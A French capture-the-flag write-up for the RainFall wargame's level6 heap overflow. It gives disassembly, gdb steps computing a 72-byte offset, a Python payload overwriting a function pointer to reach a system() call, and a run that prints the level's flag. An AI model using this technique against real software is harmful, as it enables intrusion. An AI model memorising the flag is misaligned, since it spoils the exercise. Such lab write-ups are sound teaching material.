# level6: HEAP OVERFLOW

### Target

Nous avons une fonction **n** qui fait un call system d'un sh parfait pour notre exploitation
```s
08048454 <n>:
 8048454:	55                   	push   %ebp
 8048455:	89 e5                	mov    %esp,%ebp
 8048457:	83 ec 18             	sub    $0x18,%esp
 804845a:	c7 04 24 b0 85 04 08 	movl   $0x80485b0,(%esp)
 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
 8048466:	c9                   	leave  
 8048467:	c3                   	ret    
```

### offset

Pour calculez l'offset pour overflow la heap nous devons soustraire chaque adresse stocker dans eax apres chaque call de malloc et les soustraires ensembles.

```s
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.
(gdb) b *main+21
Breakpoint 1 at 0x8048491
(gdb) b *main+37
Breakpoint 2 at 0x80484a1
(gdb) b *main+86
Breakpoint 3 at 0x80484d2
(gdb) r AAAA
Starting program: /home/user/level6/level6 AAAA

Breakpoint 1, 0x08048491 in main ()
(gdb) p/x 0x08048491
$1 = 0x8048491
(gdb) p/x $eax
$2 = 0x804a008
(gdb) next
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x080484a1 in main ()
(gdb) p/x $eax
$3 = 0x804a050
(gdb) 0x804a008 - 0x804a050
Undefined command: "0x804a008".  Try "help".
(gdb) p 0x804a008 - 0x804a050
$4 = -72
(gdb) quit
```
> _Notre offset est de 72 octets_.

### payload

```bash
$(python -c 'print "A"*(72) + "\x54\x84\x04\x08"')
```

### testing

```bash
level6@RainFall:~$ ./level6  $(python -c 'print "A"*(72) + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

TADA ! 

Bonne chance et have fun :)
